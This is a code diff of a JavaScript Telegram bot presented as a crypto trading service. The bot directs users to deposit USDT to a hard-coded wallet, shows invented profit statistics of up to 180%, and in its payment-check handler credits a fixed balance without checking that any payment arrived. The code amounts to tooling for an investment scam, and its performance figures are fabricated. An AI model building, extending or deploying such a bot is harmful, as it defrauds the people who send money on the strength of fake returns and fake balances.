@@ -136,10 +136,6 @@ Wallet address USDT TRC-20:
       }
     };
 
-    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
-    const adminMessage = `New deposit: ${chatId}`;
-    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur
-
     bot.sendMessage(chatId, depositMessage, inlineKeyboard);
   } else if (text === 'Withdrawal') {
     bot.sendMessage(chatId, 'The minimum withdrawal is 25 USDT');
@@ -205,44 +201,22 @@ Trading status: Stopped 🚫`;
 
     bot.editMessageText(tradingMessage, { chat_id: chatId, message_id: message.message_id, reply_markup: inlineKeyboard.reply_markup });
   } else if (data === 'statistics') {
-    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%');
-  } else if (data === 'deposit') {
-    const depositMessage = `❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). 
-The transfer is realized automatically.
-
-❗️ The minimum amount for replenishment is 20 USDT
-➖➖➖➖➖
-Wallet address USDT TRC-20:
-\`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\`
-(To copy, click on the wallet👆)`;
-
-    const inlineKeyboard = {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: 'Check payment', callback_data: 'check_payment' }]
-        ]
-      }
-    };
-
-    bot.sendMessage(chatId, depositMessage, inlineKeyboard);
+    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: Profit 5%\n3 days: Profit 12%\n7 days: Profit 20%\n1 month: Profit 60%\n3 months: Profit 180%');
   } else if (data === 'check_payment') {
-    bot.sendMessage(chatId, 'Payment checked!'); // Placeholder message for payment check
-    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
-    const adminMessage = `New deposit: ${chatId}`;
-    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur
+    const userData = getUserData(chatId);
+    if (!userData) {
+      bot.sendMessage(chatId, 'Please start the bot with /start command first.');
+      return;
+    }
+
+    const depositAmount = 20.00; // Example amount
+    const newBalance = parseFloat(userData.balance) + depositAmount;
+
+    setUserData(chatId, newBalance.toFixed(2), userData.withdrawal, userData.registrationDate);
+
+    bot.sendMessage(chatId, `Your balance has been updated. New balance: ${newBalance.toFixed(2)} USDT`);
+
+    // Inform admin
+    bot.sendMessage(adminChatId, `New deposit: user id ${chatId}, amount: ${depositAmount} USDT`);
   }
-});
-
-
-
-//Créez un serveur HTTP simple qui renvoie "I'm alive" lorsque vous accédez à son URL
-const server = http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.write("I'm alive");
-    res.end();
-});
-
-// Écoutez le port 8080
-server.listen(8080, () => {
-    console.log("Keep alive server is running on port 8080");
 });
